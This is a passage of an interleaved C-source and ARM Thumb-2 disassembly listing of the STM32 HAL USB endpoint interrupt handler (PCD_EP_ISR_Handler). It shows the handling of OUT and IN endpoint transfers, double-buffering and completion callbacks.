 8002812:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8002814:	b29b      	uxth	r3, r3
 8002816:	029b      	lsls	r3, r3, #10
 8002818:	b29b      	uxth	r3, r3
 800281a:	4313      	orrs	r3, r2
 800281c:	b29b      	uxth	r3, r3
 800281e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002822:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002826:	b29a      	uxth	r2, r3
 8002828:	697b      	ldr	r3, [r7, #20]
 800282a:	801a      	strh	r2, [r3, #0]
 800282c:	e026      	b.n	800287c <PCD_EP_ISR_Handler+0x2d6>
 800282e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002830:	691b      	ldr	r3, [r3, #16]
 8002832:	2b00      	cmp	r3, #0
 8002834:	d10a      	bne.n	800284c <PCD_EP_ISR_Handler+0x2a6>
 8002836:	697b      	ldr	r3, [r7, #20]
 8002838:	881b      	ldrh	r3, [r3, #0]
 800283a:	b29b      	uxth	r3, r3
 800283c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002840:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002844:	b29a      	uxth	r2, r3
 8002846:	697b      	ldr	r3, [r7, #20]
 8002848:	801a      	strh	r2, [r3, #0]
 800284a:	e017      	b.n	800287c <PCD_EP_ISR_Handler+0x2d6>
 800284c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800284e:	691b      	ldr	r3, [r3, #16]
 8002850:	085b      	lsrs	r3, r3, #1
 8002852:	647b      	str	r3, [r7, #68]	; 0x44
 8002854:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002856:	691b      	ldr	r3, [r3, #16]
 8002858:	f003 0301 	and.w	r3, r3, #1
 800285c:	2b00      	cmp	r3, #0
 800285e:	d002      	beq.n	8002866 <PCD_EP_ISR_Handler+0x2c0>
 8002860:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8002862:	3301      	adds	r3, #1
 8002864:	647b      	str	r3, [r7, #68]	; 0x44
 8002866:	697b      	ldr	r3, [r7, #20]
 8002868:	881b      	ldrh	r3, [r3, #0]
 800286a:	b29a      	uxth	r2, r3
 800286c:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800286e:	b29b      	uxth	r3, r3
 8002870:	029b      	lsls	r3, r3, #10
 8002872:	b29b      	uxth	r3, r3
 8002874:	4313      	orrs	r3, r2
 8002876:	b29a      	uxth	r2, r3
 8002878:	697b      	ldr	r3, [r7, #20]
 800287a:	801a      	strh	r2, [r3, #0]
            PCD_SET_EP_RX_STATUS(hpcd->Instance, PCD_ENDP0, USB_EP_RX_VALID);
 800287c:	687b      	ldr	r3, [r7, #4]
 800287e:	681b      	ldr	r3, [r3, #0]
 8002880:	881b      	ldrh	r3, [r3, #0]
 8002882:	b29b      	uxth	r3, r3
 8002884:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002888:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800288c:	827b      	strh	r3, [r7, #18]
 800288e:	8a7b      	ldrh	r3, [r7, #18]
 8002890:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8002894:	827b      	strh	r3, [r7, #18]
 8002896:	8a7b      	ldrh	r3, [r7, #18]
 8002898:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 800289c:	827b      	strh	r3, [r7, #18]
 800289e:	687b      	ldr	r3, [r7, #4]
 80028a0:	681a      	ldr	r2, [r3, #0]
 80028a2:	8a7b      	ldrh	r3, [r7, #18]
 80028a4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80028a8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80028ac:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80028b0:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80028b4:	b29b      	uxth	r3, r3
 80028b6:	8013      	strh	r3, [r2, #0]
 80028b8:	e22c      	b.n	8002d14 <PCD_EP_ISR_Handler+0x76e>
    }
    else
    {
      /* Decode and service non control endpoints interrupt */
      /* process related endpoint register */
      wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, epindex);
 80028ba:	687b      	ldr	r3, [r7, #4]
 80028bc:	681b      	ldr	r3, [r3, #0]
 80028be:	461a      	mov	r2, r3
 80028c0:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 80028c4:	009b      	lsls	r3, r3, #2
 80028c6:	4413      	add	r3, r2
 80028c8:	881b      	ldrh	r3, [r3, #0]
 80028ca:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

      if ((wEPVal & USB_EP_CTR_RX) != 0U)
 80028ce:	f9b7 304a 	ldrsh.w	r3, [r7, #74]	; 0x4a
 80028d2:	2b00      	cmp	r3, #0
 80028d4:	f280 80f6 	bge.w	8002ac4 <PCD_EP_ISR_Handler+0x51e>
      {
        /* clear int flag */
        PCD_CLEAR_RX_EP_CTR(hpcd->Instance, epindex);
 80028d8:	687b      	ldr	r3, [r7, #4]
 80028da:	681b      	ldr	r3, [r3, #0]
 80028dc:	461a      	mov	r2, r3
 80028de:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 80028e2:	009b      	lsls	r3, r3, #2
 80028e4:	4413      	add	r3, r2
 80028e6:	881b      	ldrh	r3, [r3, #0]
 80028e8:	b29a      	uxth	r2, r3
 80028ea:	f640 738f 	movw	r3, #3983	; 0xf8f
 80028ee:	4013      	ands	r3, r2
 80028f0:	f8a7 3048 	strh.w	r3, [r7, #72]	; 0x48
 80028f4:	687b      	ldr	r3, [r7, #4]
 80028f6:	681b      	ldr	r3, [r3, #0]
 80028f8:	461a      	mov	r2, r3
 80028fa:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 80028fe:	009b      	lsls	r3, r3, #2
 8002900:	4413      	add	r3, r2
 8002902:	f8b7 2048 	ldrh.w	r2, [r7, #72]	; 0x48
 8002906:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 800290a:	b292      	uxth	r2, r2
 800290c:	801a      	strh	r2, [r3, #0]
        ep = &hpcd->OUT_ep[epindex];
 800290e:	f897 204d 	ldrb.w	r2, [r7, #77]	; 0x4d
 8002912:	4613      	mov	r3, r2
 8002914:	009b      	lsls	r3, r3, #2
 8002916:	4413      	add	r3, r2
 8002918:	00db      	lsls	r3, r3, #3
 800291a:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 800291e:	687a      	ldr	r2, [r7, #4]
 8002920:	4413      	add	r3, r2
 8002922:	657b      	str	r3, [r7, #84]	; 0x54

        /* OUT Single Buffering */
        if (ep->doublebuffer == 0U)
 8002924:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002926:	7b1b      	ldrb	r3, [r3, #12]
 8002928:	2b00      	cmp	r3, #0
 800292a:	d123      	bne.n	8002974 <PCD_EP_ISR_Handler+0x3ce>
        {
          count = (uint16_t)PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 800292c:	687b      	ldr	r3, [r7, #4]
 800292e:	681b      	ldr	r3, [r3, #0]
 8002930:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002934:	b29b      	uxth	r3, r3
 8002936:	461a      	mov	r2, r3
 8002938:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800293a:	781b      	ldrb	r3, [r3, #0]
 800293c:	00db      	lsls	r3, r3, #3
 800293e:	4413      	add	r3, r2
 8002940:	687a      	ldr	r2, [r7, #4]
 8002942:	6812      	ldr	r2, [r2, #0]
 8002944:	4413      	add	r3, r2
 8002946:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800294a:	881b      	ldrh	r3, [r3, #0]
 800294c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002950:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

          if (count != 0U)
 8002954:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002958:	2b00      	cmp	r3, #0
 800295a:	f000 808e 	beq.w	8002a7a <PCD_EP_ISR_Handler+0x4d4>
          {
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaadress, count);
 800295e:	687b      	ldr	r3, [r7, #4]
 8002960:	6818      	ldr	r0, [r3, #0]
 8002962:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002964:	6959      	ldr	r1, [r3, #20]
 8002966:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002968:	88da      	ldrh	r2, [r3, #6]
 800296a:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 800296e:	f005 fdda 	bl	8008526 <USB_ReadPMA>
 8002972:	e082      	b.n	8002a7a <PCD_EP_ISR_Handler+0x4d4>
        }
#if (USE_USB_DOUBLE_BUFFER == 1U)
        else
        {
          /* manage double buffer bulk out */
          if (ep->type == EP_TYPE_BULK)
 8002974:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002976:	78db      	ldrb	r3, [r3, #3]
 8002978:	2b02      	cmp	r3, #2
 800297a:	d10a      	bne.n	8002992 <PCD_EP_ISR_Handler+0x3ec>
          {
            count = HAL_PCD_EP_DB_Receive(hpcd, ep, wEPVal);
 800297c:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002980:	461a      	mov	r2, r3
 8002982:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002984:	6878      	ldr	r0, [r7, #4]
 8002986:	f000 f9d3 	bl	8002d30 <HAL_PCD_EP_DB_Receive>
 800298a:	4603      	mov	r3, r0
 800298c:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50
 8002990:	e073      	b.n	8002a7a <PCD_EP_ISR_Handler+0x4d4>
          }
          else /* manage double buffer iso out */
          {
            /* free EP OUT Buffer */
            PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002992:	687b      	ldr	r3, [r7, #4]
 8002994:	681b      	ldr	r3, [r3, #0]
 8002996:	461a      	mov	r2, r3
 8002998:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800299a:	781b      	ldrb	r3, [r3, #0]
 800299c:	009b      	lsls	r3, r3, #2
 800299e:	4413      	add	r3, r2
 80029a0:	881b      	ldrh	r3, [r3, #0]
 80029a2:	b29b      	uxth	r3, r3
 80029a4:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80029a8:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80029ac:	f8a7 3052 	strh.w	r3, [r7, #82]	; 0x52
 80029b0:	687b      	ldr	r3, [r7, #4]
 80029b2:	681b      	ldr	r3, [r3, #0]
 80029b4:	461a      	mov	r2, r3
 80029b6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029b8:	781b      	ldrb	r3, [r3, #0]
 80029ba:	009b      	lsls	r3, r3, #2
 80029bc:	441a      	add	r2, r3
 80029be:	f8b7 3052 	ldrh.w	r3, [r7, #82]	; 0x52
 80029c2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80029c6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80029ca:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80029ce:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80029d2:	b29b      	uxth	r3, r3
 80029d4:	8013      	strh	r3, [r2, #0]

            if ((PCD_GET_ENDPOINT(hpcd->Instance, ep->num) & USB_EP_DTOG_RX) != 0U)
 80029d6:	687b      	ldr	r3, [r7, #4]
 80029d8:	681b      	ldr	r3, [r3, #0]
 80029da:	461a      	mov	r2, r3
 80029dc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029de:	781b      	ldrb	r3, [r3, #0]
 80029e0:	009b      	lsls	r3, r3, #2
 80029e2:	4413      	add	r3, r2
 80029e4:	881b      	ldrh	r3, [r3, #0]
 80029e6:	b29b      	uxth	r3, r3
 80029e8:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80029ec:	2b00      	cmp	r3, #0
 80029ee:	d022      	beq.n	8002a36 <PCD_EP_ISR_Handler+0x490>
            {
              /* read from endpoint BUF0Addr buffer */
              count = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 80029f0:	687b      	ldr	r3, [r7, #4]
 80029f2:	681b      	ldr	r3, [r3, #0]
 80029f4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80029f8:	b29b      	uxth	r3, r3
 80029fa:	461a      	mov	r2, r3
 80029fc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029fe:	781b      	ldrb	r3, [r3, #0]
 8002a00:	00db      	lsls	r3, r3, #3
 8002a02:	4413      	add	r3, r2
 8002a04:	687a      	ldr	r2, [r7, #4]
 8002a06:	6812      	ldr	r2, [r2, #0]
 8002a08:	4413      	add	r3, r2
 8002a0a:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002a0e:	881b      	ldrh	r3, [r3, #0]
 8002a10:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002a14:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

              if (count != 0U)
 8002a18:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002a1c:	2b00      	cmp	r3, #0
 8002a1e:	d02c      	beq.n	8002a7a <PCD_EP_ISR_Handler+0x4d4>
              {
                USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);
 8002a20:	687b      	ldr	r3, [r7, #4]
 8002a22:	6818      	ldr	r0, [r3, #0]
 8002a24:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a26:	6959      	ldr	r1, [r3, #20]
 8002a28:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a2a:	891a      	ldrh	r2, [r3, #8]
 8002a2c:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002a30:	f005 fd79 	bl	8008526 <USB_ReadPMA>
 8002a34:	e021      	b.n	8002a7a <PCD_EP_ISR_Handler+0x4d4>
              }
            }
            else
            {
              /* read from endpoint BUF1Addr buffer */
              count = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8002a36:	687b      	ldr	r3, [r7, #4]
 8002a38:	681b      	ldr	r3, [r3, #0]
 8002a3a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002a3e:	b29b      	uxth	r3, r3
 8002a40:	461a      	mov	r2, r3
 8002a42:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a44:	781b      	ldrb	r3, [r3, #0]
 8002a46:	00db      	lsls	r3, r3, #3
 8002a48:	4413      	add	r3, r2
 8002a4a:	687a      	ldr	r2, [r7, #4]
 8002a4c:	6812      	ldr	r2, [r2, #0]
 8002a4e:	4413      	add	r3, r2
 8002a50:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002a54:	881b      	ldrh	r3, [r3, #0]
 8002a56:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002a5a:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

              if (count != 0U)
 8002a5e:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002a62:	2b00      	cmp	r3, #0
 8002a64:	d009      	beq.n	8002a7a <PCD_EP_ISR_Handler+0x4d4>
              {
                USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);
 8002a66:	687b      	ldr	r3, [r7, #4]
 8002a68:	6818      	ldr	r0, [r3, #0]
 8002a6a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a6c:	6959      	ldr	r1, [r3, #20]
 8002a6e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a70:	895a      	ldrh	r2, [r3, #10]
 8002a72:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002a76:	f005 fd56 	bl	8008526 <USB_ReadPMA>
          }
        }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

        /* multi-packet on the NON control OUT endpoint */
        ep->xfer_count += count;
 8002a7a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a7c:	69da      	ldr	r2, [r3, #28]
 8002a7e:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002a82:	441a      	add	r2, r3
 8002a84:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a86:	61da      	str	r2, [r3, #28]
        ep->xfer_buff += count;
 8002a88:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a8a:	695a      	ldr	r2, [r3, #20]
 8002a8c:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002a90:	441a      	add	r2, r3
 8002a92:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a94:	615a      	str	r2, [r3, #20]

        if ((ep->xfer_len == 0U) || (count < ep->maxpacket))
 8002a96:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a98:	699b      	ldr	r3, [r3, #24]
 8002a9a:	2b00      	cmp	r3, #0
 8002a9c:	d005      	beq.n	8002aaa <PCD_EP_ISR_Handler+0x504>
 8002a9e:	f8b7 2050 	ldrh.w	r2, [r7, #80]	; 0x50
 8002aa2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002aa4:	691b      	ldr	r3, [r3, #16]
 8002aa6:	429a      	cmp	r2, r3
 8002aa8:	d206      	bcs.n	8002ab8 <PCD_EP_ISR_Handler+0x512>
        {
          /* RX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->DataOutStageCallback(hpcd, ep->num);
#else
          HAL_PCD_DataOutStageCallback(hpcd, ep->num);
 8002aaa:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002aac:	781b      	ldrb	r3, [r3, #0]
 8002aae:	4619      	mov	r1, r3
 8002ab0:	6878      	ldr	r0, [r7, #4]
 8002ab2:	f009 ff3d 	bl	800c930 <HAL_PCD_DataOutStageCallback>
 8002ab6:	e005      	b.n	8002ac4 <PCD_EP_ISR_Handler+0x51e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else
        {
          (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002ab8:	687b      	ldr	r3, [r7, #4]
 8002aba:	681b      	ldr	r3, [r3, #0]
 8002abc:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002abe:	4618      	mov	r0, r3
 8002ac0:	f003 ffe3 	bl	8006a8a <USB_EPStartXfer>
        }
      }

      if ((wEPVal & USB_EP_CTR_TX) != 0U)
 8002ac4:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002ac8:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8002acc:	2b00      	cmp	r3, #0
 8002ace:	f000 8121 	beq.w	8002d14 <PCD_EP_ISR_Handler+0x76e>
      {
        ep = &hpcd->IN_ep[epindex];
 8002ad2:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002ad6:	1c5a      	adds	r2, r3, #1
 8002ad8:	4613      	mov	r3, r2
 8002ada:	009b      	lsls	r3, r3, #2
 8002adc:	4413      	add	r3, r2
 8002ade:	00db      	lsls	r3, r3, #3
 8002ae0:	687a      	ldr	r2, [r7, #4]
 8002ae2:	4413      	add	r3, r2
 8002ae4:	657b      	str	r3, [r7, #84]	; 0x54

        /* clear int flag */
        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, epindex);
 8002ae6:	687b      	ldr	r3, [r7, #4]
 8002ae8:	681b      	ldr	r3, [r3, #0]
 8002aea:	461a      	mov	r2, r3
 8002aec:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002af0:	009b      	lsls	r3, r3, #2
 8002af2:	4413      	add	r3, r2
 8002af4:	881b      	ldrh	r3, [r3, #0]
 8002af6:	b29b      	uxth	r3, r3
 8002af8:	f423 43e1 	bic.w	r3, r3, #28800	; 0x7080
 8002afc:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002b00:	f8a7 3042 	strh.w	r3, [r7, #66]	; 0x42
 8002b04:	687b      	ldr	r3, [r7, #4]
 8002b06:	681b      	ldr	r3, [r3, #0]
 8002b08:	461a      	mov	r2, r3
 8002b0a:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002b0e:	009b      	lsls	r3, r3, #2
 8002b10:	441a      	add	r2, r3
 8002b12:	f8b7 3042 	ldrh.w	r3, [r7, #66]	; 0x42
 8002b16:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002b1a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002b1e:	b29b      	uxth	r3, r3
 8002b20:	8013      	strh	r3, [r2, #0]

        if (ep->type == EP_TYPE_ISOC)
 8002b22:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b24:	78db      	ldrb	r3, [r3, #3]
 8002b26:	2b01      	cmp	r3, #1
 8002b28:	f040 80a2 	bne.w	8002c70 <PCD_EP_ISR_Handler+0x6ca>
        {
          ep->xfer_len = 0U;
 8002b2c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b2e:	2200      	movs	r2, #0
 8002b30:	619a      	str	r2, [r3, #24]

#if (USE_USB_DOUBLE_BUFFER == 1U)
          if (ep->doublebuffer != 0U)
 8002b32:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b34:	7b1b      	ldrb	r3, [r3, #12]
 8002b36:	2b00      	cmp	r3, #0
 8002b38:	f000 8093 	beq.w	8002c62 <PCD_EP_ISR_Handler+0x6bc>
          {
            if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002b3c:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002b40:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002b44:	2b00      	cmp	r3, #0
 8002b46:	d046      	beq.n	8002bd6 <PCD_EP_ISR_Handler+0x630>
            {
              PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002b48:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b4a:	785b      	ldrb	r3, [r3, #1]
 8002b4c:	2b00      	cmp	r3, #0
 8002b4e:	d126      	bne.n	8002b9e <PCD_EP_ISR_Handler+0x5f8>
 8002b50:	687b      	ldr	r3, [r7, #4]
 8002b52:	681b      	ldr	r3, [r3, #0]
 8002b54:	627b      	str	r3, [r7, #36]	; 0x24
 8002b56:	687b      	ldr	r3, [r7, #4]
 8002b58:	681b      	ldr	r3, [r3, #0]
 8002b5a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002b5e:	b29b      	uxth	r3, r3
 8002b60:	461a      	mov	r2, r3
 8002b62:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002b64:	4413      	add	r3, r2
 8002b66:	627b      	str	r3, [r7, #36]	; 0x24
 8002b68:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b6a:	781b      	ldrb	r3, [r3, #0]
 8002b6c:	00da      	lsls	r2, r3, #3
 8002b6e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002b70:	4413      	add	r3, r2
 8002b72:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002b76:	623b      	str	r3, [r7, #32]
 8002b78:	6a3b      	ldr	r3, [r7, #32]
 8002b7a:	881b      	ldrh	r3, [r3, #0]
 8002b7c:	b29b      	uxth	r3, r3
 8002b7e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002b82:	b29a      	uxth	r2, r3
 8002b84:	6a3b      	ldr	r3, [r7, #32]
 8002b86:	801a      	strh	r2, [r3, #0]
 8002b88:	6a3b      	ldr	r3, [r7, #32]
 8002b8a:	881b      	ldrh	r3, [r3, #0]
 8002b8c:	b29b      	uxth	r3, r3
 8002b8e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002b92:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002b96:	b29a      	uxth	r2, r3
 8002b98:	6a3b      	ldr	r3, [r7, #32]
 8002b9a:	801a      	strh	r2, [r3, #0]
 8002b9c:	e061      	b.n	8002c62 <PCD_EP_ISR_Handler+0x6bc>
 8002b9e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ba0:	785b      	ldrb	r3, [r3, #1]
 8002ba2:	2b01      	cmp	r3, #1
 8002ba4:	d15d      	bne.n	8002c62 <PCD_EP_ISR_Handler+0x6bc>
 8002ba6:	687b      	ldr	r3, [r7, #4]
 8002ba8:	681b      	ldr	r3, [r3, #0]
 8002baa:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002bac:	687b      	ldr	r3, [r7, #4]
 8002bae:	681b      	ldr	r3, [r3, #0]
 8002bb0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002bb4:	b29b      	uxth	r3, r3
 8002bb6:	461a      	mov	r2, r3
 8002bb8:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002bba:	4413      	add	r3, r2
 8002bbc:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002bbe:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bc0:	781b      	ldrb	r3, [r3, #0]
 8002bc2:	00da      	lsls	r2, r3, #3
 8002bc4:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002bc6:	4413      	add	r3, r2
 8002bc8:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002bcc:	62bb      	str	r3, [r7, #40]	; 0x28
 8002bce:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002bd0:	2200      	movs	r2, #0
 8002bd2:	801a      	strh	r2, [r3, #0]
 8002bd4:	e045      	b.n	8002c62 <PCD_EP_ISR_Handler+0x6bc>
            }
            else
            {
              PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002bd6:	687b      	ldr	r3, [r7, #4]
 8002bd8:	681b      	ldr	r3, [r3, #0]
 8002bda:	63fb      	str	r3, [r7, #60]	; 0x3c
 8002bdc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bde:	785b      	ldrb	r3, [r3, #1]
 8002be0:	2b00      	cmp	r3, #0
 8002be2:	d126      	bne.n	8002c32 <PCD_EP_ISR_Handler+0x68c>
 8002be4:	687b      	ldr	r3, [r7, #4]
 8002be6:	681b      	ldr	r3, [r3, #0]
 8002be8:	637b      	str	r3, [r7, #52]	; 0x34
 8002bea:	687b      	ldr	r3, [r7, #4]
 8002bec:	681b      	ldr	r3, [r3, #0]
 8002bee:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002bf2:	b29b      	uxth	r3, r3
 8002bf4:	461a      	mov	r2, r3
 8002bf6:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002bf8:	4413      	add	r3, r2
 8002bfa:	637b      	str	r3, [r7, #52]	; 0x34
 8002bfc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bfe:	781b      	ldrb	r3, [r3, #0]
 8002c00:	00da      	lsls	r2, r3, #3
 8002c02:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002c04:	4413      	add	r3, r2
 8002c06:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002c0a:	633b      	str	r3, [r7, #48]	; 0x30
 8002c0c:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002c0e:	881b      	ldrh	r3, [r3, #0]
 8002c10:	b29b      	uxth	r3, r3
 8002c12:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002c16:	b29a      	uxth	r2, r3
 8002c18:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002c1a:	801a      	strh	r2, [r3, #0]
 8002c1c:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002c1e:	881b      	ldrh	r3, [r3, #0]
 8002c20:	b29b      	uxth	r3, r3
 8002c22:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002c26:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002c2a:	b29a      	uxth	r2, r3
 8002c2c:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002c2e:	801a      	strh	r2, [r3, #0]
 8002c30:	e017      	b.n	8002c62 <PCD_EP_ISR_Handler+0x6bc>
 8002c32:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c34:	785b      	ldrb	r3, [r3, #1]
 8002c36:	2b01      	cmp	r3, #1
 8002c38:	d113      	bne.n	8002c62 <PCD_EP_ISR_Handler+0x6bc>
 8002c3a:	687b      	ldr	r3, [r7, #4]
 8002c3c:	681b      	ldr	r3, [r3, #0]
 8002c3e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002c42:	b29b      	uxth	r3, r3
 8002c44:	461a      	mov	r2, r3
 8002c46:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8002c48:	4413      	add	r3, r2
 8002c4a:	63fb      	str	r3, [r7, #60]	; 0x3c
 8002c4c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c4e:	781b      	ldrb	r3, [r3, #0]
 8002c50:	00da      	lsls	r2, r3, #3
 8002c52:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8002c54:	4413      	add	r3, r2
 8002c56:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002c5a:	63bb      	str	r3, [r7, #56]	; 0x38
 8002c5c:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8002c5e:	2200      	movs	r2, #0
 8002c60:	801a      	strh	r2, [r3, #0]

          /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->DataInStageCallback(hpcd, ep->num);
#else
          HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002c62:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c64:	781b      	ldrb	r3, [r3, #0]
 8002c66:	4619      	mov	r1, r3
 8002c68:	6878      	ldr	r0, [r7, #4]
